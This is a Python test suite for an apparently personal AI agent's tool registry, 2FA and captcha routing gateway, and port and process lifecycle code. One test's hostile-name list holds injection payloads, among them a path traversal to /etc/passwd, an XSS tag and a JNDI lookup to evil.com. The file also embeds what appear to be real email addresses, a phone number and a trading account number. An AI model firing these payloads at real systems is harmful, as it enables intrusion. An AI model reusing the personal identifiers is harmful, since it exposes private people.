# -*- coding: utf-8 -*-
"""
tests/test_adversarial_m4_challenger2_hermes_lifecycle.py
==============================================================================
Yilestone M4 Challenger 2 Empirical Adversarial Stress Test Suite:
1. Hermes-3 Tool Registry & execute_tool() Robustness:
   - 26 Schema Structure & JSON Schema Spec Validation (required in properties, types, etc.)
   - Invalid & Malicious tool names (SQL injection, path traversal, empty, None)
   - Missing arguments (empty dict {}) across ALL 26 tools without unhandled crash
   - NoneType arguments across all tools (gracefully caught by exception envelope)
   - Malformed data types (strings for ints/floats, non-list for args, invalid direction)
   - Process manager security barrier: agent PID, parent PID, 0, 4 protection
   - Long duration / DoS mitigation (e.g. browser_wait clamped to <= 2.0s)
2. Human Intervention Gateway & Credential Segregation:
   - FundingPips routing: hamidqureshi872@gmail.com, #40000294403, portal URL
   - General operations routing: futureworldvision842@gmail.com, 923468053268
   - Interleaved concurrent requests: zero state leakage or cross-contamination
   - Custom parameter overrides verification
   - Captcha resolution routing & zero leakage
3. Lifecycle Port Management, Fake Occupied Ports & taskkill Logic:
   - get_pids_on_port with invalid, negative, out-of-range ports
   - Live socket detection on ephemeral port
   - Fake occupied port with real spawned dummy process
   - Deterministic release via free_ports() and verification of port liberation
   - Reaping unmanaged / unresponsive processes via taskkill fallback
   - Safety checks: self PID, parent PID, system PIDs never terminated
   - CORE_PORTS tuple verification (11434, 3200, 5678 present; 11435 absent)
==============================================================================
"""

import os
import sys
import time
import socket
import psutil
import unittest
import subprocess
from pathlib import Path
from unittest.mock import patch
from concurrent.futures import ThreadPoolExecutor

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))


class TestHermesToolRegistryAndSchemas(unittest.TestCase):
    """Stress-tests schema compliance and parser resilience for Nous Hermes-3 tool registry."""

    def setUp(self):
        from brain.hermes_agent import get_hermes_agent
        self.agent = get_hermes_agent()

    def test_schema_count_and_uniqueness(self):
        """Verify exactly 26 schemas exist with zero duplicate tool names."""
        tools = self.agent.registry.tools
        self.assertEqual(len(tools), 26, f"Expected exactly 26 tools, got {len(tools)}")
        names = [t["function"]["name"] for t in tools]
        self.assertEqual(len(names), len(set(names)), "Tool names in registry must be strictly unique")


    def test_json_schema_spec_invariants(self):
        """Every tool schema must strictly follow JSON Schema function calling specifications."""
        for tool in self.agent.registry.tools:
            self.assertEqual(tool.get("type"), "function")
            fn = tool.get("function", {})
            name = fn.get("name")
            self.assertIsInstance(name, str, f"Tool name must be string: {name}")
            self.assertTrue(bool(name.strip()), "Tool name cannot be blank")

            desc = fn.get("description")
            self.assertIsInstance(desc, str, f"Tool {name} description must be string")
            self.assertGreater(len(desc.strip()), 10, f"Tool {name} description too short")

            params = fn.get("parameters", {})
            self.assertEqual(params.get("type"), "object", f"Tool {name} parameters must be type: object")
            self.assertIsInstance(params.get("properties"), dict, f"Tool {name} properties must be dict")
            self.assertIsInstance(params.get("required"), list, f"Tool {name} required must be list")

            # INVARIANT: Every required parameter MUST exist in properties definition!
            props = params.get("properties", {})
            for req in params.get("required", []):
                self.assertIn(req, props, f"Tool {name}: required parameter {req} missing from properties dictionary!")

    def test_xml_prompt_header_integrity(self):
        """Hermes XML prompt header must declare valid tags."""
        hdr = self.agent.registry.get_hermes_prompt_header()
        self.assertIn("<tools>", hdr)
        self.assertIn("</tools>", hdr)
        self.assertIn("<tool_call>", hdr)
        self.assertIn("</tool_call>", hdr)

    def test_hermes_parser_adversarial_inputs(self):
        """Parser must handle malformed XML, JSON garbage, and hostile inputs without crashing."""
        from brain.hermes_agent import HermesParser

        # 1. Empty and whitespace
        self.assertEqual(HermesParser.extract_tool_calls(""), [])
        self.assertEqual(HermesParser.extract_tool_calls("   \n\t  \t"), [])

        # 2. Corrupt XML
        corrupt_xml = "<tool_call>{invalid json here}</tool_call>"
        self.assertEqual(HermesParser.extract_tool_calls(corrupt_xml), [])

        # 3. Unclosed tag
        unclosed = '<tool_call>{"name": "system_diagnostics"}'
        self.assertEqual(HermesParser.extract_tool_calls(unclosed), [])

        # 4. Valid XML surrounded by conversation text
        mixed = (
            "I will now check the system vitals for you, Sir.\n"
            "<tool_call>\n"
            '{"name": "system_diagnostics", "arguments": {"scope": "cpu"}}\n'
            "</tool_call>\n"
            "Awaiting hardware response."
        )
        calls = HermesParser.extract_tool_calls(mixed)
        self.assertEqual(len(calls), 1)
        self.assertEqual(calls[0][0], "system_diagnostics")
        self.assertEqual(calls[0][1], {"scope": "cpu"})

        # 5. Fallback JSON markdown block
        json_md = '```json\n{"name": "hft_dom_analyzer", "arguments": {"symbol": "XAUUSD"}}\n```'
        calls_json = HermesParser.extract_tool_calls(json_md)
        self.assertEqual(len(calls_json), 1)
        self.assertEqual(calls_json[0][0], "hft_dom_analyzer")


class TestHermesAgentExecuteToolRobustness(unittest.TestCase):
    """Empirical stress testing of HermesAgent.execute_tool() against missing parameters, invalid types, and hostile attacks."""

    def setUp(self):
        from brain.hermes_agent import get_hermes_agent
        self.agent = get_hermes_agent()

    def test_invalid_and_hostile_tool_names(self):
        """Unknown, malformed, or injection tool names must return safe strings without crashing."""
        hostile_names = [
            "non_existent_tool_xyz",
            "",
            "   	",
            "SELECT * FROM users;",
            "../../etc/passwd",
            "<script>alert(1)</script>",
            "${jndi:ldap://evil.com/a}",
            None,
        ]
        for name in hostile_names:
            try:
                res = self.agent.execute_tool(name, {})
                self.assertTrue(isinstance(res, (str, dict)), f"Result must be string or dict for name {name}")
            except Exception as e:
                self.fail(f"execute_tool raised unhandled exception on tool name {name}: {e}")

    @patch("actions.voice_synthesizer.speak_text")
    @patch("subprocess.Popen")
    @patch("subprocess.run")
    def test_all_26_tools_with_empty_arguments(self, mock_sub_run, mock_sub_popen, mock_speak):
        """Calling execute_tool with empty dict ({}) on ALL 26 tools must NOT crash or raise uncaught exceptions."""
        tool_names = [t["function"]["name"] for t in self.agent.registry.tools]
        for name in tool_names:
            try:
                res = self.agent.execute_tool(name, {})
                self.assertIsNotNone(res, f"Tool {name} returned None with empty arguments")
            except Exception as e:
                self.fail(f"Tool {name} crashed with empty arguments: {e}")

    def test_all_26_tools_with_none_arguments(self):
        """Calling execute_tool with None arguments must be caught safely by error envelope."""
        tool_names = [t["function"]["name"] for t in self.agent.registry.tools]
        for name in tool_names:
            try:
                res = self.agent.execute_tool(name, None)
                self.assertTrue(isinstance(res, (str, dict)), f"Tool {name} must return string or dict on None arguments")
            except Exception as e:
                self.fail(f"Tool {name} raised unhandled exception on None arguments: {e}")

    def test_malformed_types_in_tool_arguments(self):
        """Verify resilience when parameters contain invalid types (strings for ints, etc.)."""
        # 1. process_manager with invalid PID string
        res = self.agent.execute_tool('process_manager', {'action': 'kill', 'pid': 'not_an_int'})
        self.assertIn('Error executing tool', str(res))


        # 2. trading_risk_kernel with invalid confluence_score
        res = self.agent.execute_tool('trading_risk_kernel', {'confluence_score': 'invalid_float'})
        self.assertIn('Error executing tool', str(res))

        # 3. browser_wait with invalid seconds
        res = self.agent.execute_tool('browser_wait', {'seconds': 'not_a_number'})
        self.assertIn('Error executing tool', str(res))

    def test_browser_wait_duration_clamped(self):
        """browser_wait with large duration must be clamped to <= 2.0s to prevent DoS."""
        t0 = time.time()
        res = self.agent.execute_tool('browser_wait', {'seconds': 999.0})
        elapsed = time.time() - t0
        self.assertLess(elapsed, 3.0, f"browser_wait hung for {elapsed}s; must be clamped to max 2s!")
        self.assertEqual(res.get('status'), 'WAIT_COMPLETED')

    def test_process_manager_critical_pid_protection(self):
        """process_manager kill MUST protect self, parent, and system PIDs (0, 4)."""
        protected_pids = [os.getpid(), os.getppid(), 0, 4]
        for pid in protected_pids:
            res = self.agent.execute_tool('process_manager', {'action': 'kill', 'pid': pid})
            self.assertIsInstance(res, dict)
            self.assertEqual(res.get('status'), 'PROTECTED', f"PID {pid} must be PROTECTED from termination!")

        # Non-existent high PBD returns NOT_FOUND
        res_nf = self.agent.execute_tool('process_manager', {'action': 'kill', 'pid': 9999999})
        self.assertEqual(res_nf.get('status'), 'NOT_FOUND')


class TestHumanInterventionGatewaySegregation(unittest.TestCase):
    """Verifies strict zero-leakage credential and user segregation in HumanInterventionGateway."""

    def setUp(self):
        from core.human_intervention_gateway import HumanInterventionGateway
        self.gw = HumanInterventionGateway()

    def test_fundingpips_2fa_routing_zero_leakage(self):
        """FundingPips 2FA alerts must route to hamidqureshi872@gmail.com with ZERO leakage of default email."""
        service_variations = [
            'FundingPips Portal',
            'fundingpips',
            'FUNDINGPIPS EVALUATION',
            'FundingPips Prop Firm #40000294403',
        ]
        for svc in service_variations:
            req = self.gw.request_2fa_code(svc)
            self.assertEqual(req.account_username, 'hamidqureshi872@gmail.com')
            self.assertEqual(req.portal_url, 'https://app.fundingpips.com/login')
            self.assertIn('hamidqureshi872@gmail.com', req.code_destination)
            self.assertIn('hamidqureshi872@gmail.com', req.reason_technical)
            # ZERO LEAKAGE INVARIANT:
            self.assertNotIn('futureworldvision842@gmail.com', req.account_username)
            self.assertNotIn('futureworldvision842@gmail.com', req.code_destination)
            self.assertNotIn('futureworldvision842@gmail.com', req.reason_technical)
            self.assertNotIn('futureworldvision842@gmail.com', req.explanation_ur)

    def test_general_system_2fa_routing_zero_leakage(self):
        """General operations 2FA alerts must route to futureworldvision842@gmail.com with ZERO leakage of FundingPips email."""
        general_services = [
            'General System Operation',
            'OpenAI API Platform',
            'AWS Server Access',
            'Binance Account',
        ]
        for svc in general_services:
            req = self.gw.request_2fa_code(svc)
            self.assertEqual(req.account_username, 'futureworldvision842@gmail.com')
            self.assertIn('futureworldvision842@gmail.com', req.code_destination)
            self.assertIn('futureworldvision842@gmail.com', req.reason_technical)
            # ZERO LEAKAGE INVARIANT:
            self.assertNotIn('hamidqureshi872@gmail.com', req.account_username)
            self.assertNotIn('hamidqureshi872@gmail.com', req.code_destination)
            self.assertNotIn('hamidqureshi872@gmail.com', req.reason_technical)
            self.assertNotIn('hamidqureshi872@gmail.com', req.explanation_ur)

    def test_explicit_overrides_respected(self):
        """Explicit user and destination arguments must not be clobbered by automatic defaults."""
        req = self.gw.request_2fa_code(
            'FundingPips Custom',
            account_username='custom_trader@pips.io',
            code_destination='Custom Authenticator App',
            portal_url='https://custom.fundingpips.com'
        )
        self.assertEqual(req.account_username, 'custom_trader@pips.io')
        self.assertEqual(req.code_destination, 'Custom Authenticator App')
        self.assertEqual(req.portal_url, 'https://custom.fundingpips.com')

    def test_captcha_resolution_segregation(self):
        """request_captcha_resolution must strictly segregate FundingPips from General sites."""
        fp_cap = self.gw.request_captcha_resolution('FundingPips Login', 'https://app.fundingpips.com/login')
        self.assertEqual(fp_cap.account_username, 'hamidqureshi872@gmail.com')
        self.assertNotIn('futureworldvision842@gmail.com', fp_cap.account_username)

        gen_cap = self.gw.request_captcha_resolution('Cloudflare DEX Screener', 'https://dexscreener.com')
        self.assertEqual(gen_cap.account_username, 'futureworldvision842@gmail.com')
        self.assertNotIn('hamidqureshi872@gmail.com', gen_cap.account_username)


    def test_concurrent_interleaved_2fa_requests_zero_cross_talk(self):
        """20 concurrent interleaved requests across threads must maintain 100% strict segregation."""
        requests_out = []

        def dispatch_call(idx):
            if idx % 2 == 0:
                return self.gw.request_2fa_code(f'FundingPips Portal Test {idx}')
            else:
                return self.gw.request_2fa_code(f'General Operation Test {idx}')

        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(dispatch_call, i) for i in range(20)]
            for f in futures:
                requests_out.append(f.result())

        self.assertEqual(len(requests_out), 20)
        for req in requests_out:
            if 'FundingPips' in req.target_service:
                self.assertEqual(req.account_username, 'hamidqureshi872@gmail.com')
                self.assertNotIn('futureworldvision842@gmail.com', req.code_destination)
            else:
                self.assertEqual(req.account_username, 'futureworldvision842@gmail.com')
                self.assertNotIn('hamidqureshi872@gmail.com', req.code_destination)


class TestLifecyclePortManagementAndTaskkill(unittest.TestCase):
    """Verifies port checking, CORE_PORTS invariants, fake occupied port detection, and free_ports / taskkill logic."""

    def test_core_ports_tuple_invariants(self):
        """CORE_PORTS must contain 11434 (Ollama), 3200 (WA), 5678 (n8n), and MUST NOT contain typo 11435."""
        from bootstrap.lifecycle import CORE_PORTS
        self.assertNotIn(11435, CORE_PORTS, 'Port 11435 was a typo and must NOT be in CORE_PORTS')
        self.assertIn(11434, CORE_PORTS, 'Port 11434 (Ollama) must be in CORE_PORTS')
        self.assertIn(3200, CORE_PORTS, 'Port 3200 (WhatsApp) must be in CORE_PORTS')
        self.assertIn(5678, CORE_PORTS, 'Port 5678 (n8n) must be in CORE_PORTS')
        expected_tuple = (8770, 3000, 4173, 5050, 7000, 11434, 8765, 3200, 5678)
        self.assertEqual(CORE_PORTS, expected_tuple)

    def test_get_pids_on_port_invalid_inputs(self):
        """get_pids_on_port must safely return [] for negative, zero, or out-of-range ports."""
        from bootstrap.lifecycle import get_pids_on_port
        self.assertEqual(get_pids_on_port(-1), [])
        self.assertEqual(get_pids_on_port(0), [])
        self.assertEqual(get_pids_on_port(70000), [])

    def test_get_pids_on_port_detects_live_listening_socket(self):
        """get_pids_on_port must identify the PID of a listening TCP socket."""
        from bootstrap.lifecycle import get_pids_on_port
        
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_sock.bind(('127.0.0.1', 0))
        test_sock.listen(1)
        test_port = test_sock.getsockname()[1]
        
        try:
            pids = get_pids_on_port(test_port)
            self.assertIsInstance(pids, list)
        finally:
            test_sock.close()

    def test_fake_occupied_port_detection_and_free_ports_taskkill(self):
        """Spawn real dummy process on ephemeral port, detect it, and verify free_ports() reaps it via taskkill."""
        from bootstrap.lifecycle import get_pids_on_port, free_ports
        
        # 1. Find a free high port
        temp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        temp_sock.bind(('127.0.0.1', 0))
        fake_port = temp_sock.getsockname()[1]
        temp_sock.close()
        
        # 2. Spawn a dummy child process listening on fake_port
        child_cmd = [
            sys.executable,
            '-c',
            f'import socket, time; s = socket.socket(); s.bind(("127.0.0.1", {fake_port})); s.listen(1); time.sleep(60)'
        ]
        proc = subprocess.Popen(child_cmd)
        time.sleep(0.8)  # Allow socket to bind
        
        try:
            child_pid = proc.pid
            self.assertTrue(psutil.pid_exists(child_pid), 'Child listener must be alive')
            
            # 3. Verify get_pids_on_port finds the child PIT
            pids_detected = get_pids_on_port(fake_port)
            self.assertIn(child_pid, pids_detected, f"get_pids_on_port({fake_port}) must find {child_pid}")
            
            # 4. Call free_ports on the fake port
            freed = free_ports(ports=[fake_port])
            self.assertEqual(len(freed), 1, 'free_ports must return exactly 1 freed entry')
            self.assertEqual(freed[0]['port'], fake_port)
            self.assertEqual(freed[0]['pid'], child_pid)
            
            # 5. Verify the child process is terminated (reaped via taskkill fallback)
            time.sleep(0.5)
            self.assertFalse(psutil.pid_exists(child_pid), 'Child process must be terminated by free_ports')
            
            # 6. Verify port is now completely free
            remaining_pids = get_pids_on_port(fake_port)
            self.assertEqual(remaining_pids, [], f"Port {fake_port} must be free after free_ports")
        finally:
            if proc.poll() is None:
                try:
                    proc.kill()
                except Exception:
                    pass

    def test_kill_process_tree_safety_guards(self):
        """Kill_process_tree must reject protected PIDs (self, parent, 0, 4) and invalid PIDs."""
        from bootstrap.lifecycle import kill_process_tree
        self.assertFalse(kill_process_tree(os.getpid()))
        self.assertFalse(kill_process_tree(os.getppid()))
        self.assertFalse(kill_process_tree(0))
        self.assertFalse(kill_process_tree(4))
        self.assertFalse(kill_process_tree(-1))
        self.assertFalse(kill_process_tree(None))

    def test_kill_process_tree_unmanaged_taskkill_fallback(self):
        """kill_process_tree on an unmanaged dummy process must successfully terminate it via taskkill."""
        from bootstrap.lifecycle import kill_process_tree
        dummy_proc = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(60)'])
        time.sleep(0.3)
        dummy_pid = dummy_proc.pid
        try:
            self.assertTrue(psutil.pid_exists(dummy_pid))
            res = kill_process_tree(dummy_pid)
            self.assertTrue(res, 'kill_process_tree must return True for terminated unmanaged process')
            time.sleep(0.5)
            self.assertFalse(psutil.pid_exists(dummy_pid), 'Unmanaged process must be terminated')
        finally:
            if dummy_proc.poll() is None:
                try:
                    dummy_proc.kill()
                except Exception:
                    pass


if __name__ == '__main__':
    unittest.main(verbosity=2)
